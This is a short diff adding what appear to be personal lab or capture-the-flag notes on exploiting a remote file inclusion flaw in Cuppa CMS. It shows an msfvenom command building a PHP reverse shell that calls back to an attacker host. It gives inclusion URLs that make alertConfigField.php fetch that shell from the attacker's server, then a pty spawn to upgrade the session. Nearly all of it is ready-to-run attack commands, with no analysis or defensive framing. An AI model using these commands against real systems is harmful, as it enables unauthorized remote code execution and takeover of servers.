@@ -22,3 +22,17 @@ First, the attacker injects the malicious URL, which points to the attacker's se
 4. http://10.114.190.223/playground.php?file=http://192.168.232.84:8000/hostname.php
 
 
+msfvenom -p php/reverse_php LHOST=192.168.232.84 LPORT=4444 -f raw -o shell.txt
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=/tmp/shell.txt
+
+
+need to:
+1. host python server
+2. make msfvenom revshell
+3. upgrade shell python3 -c 'import pty; pty.spawn("/bin/bash")'
+http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.232.84/shell.txt
+
+
+
+
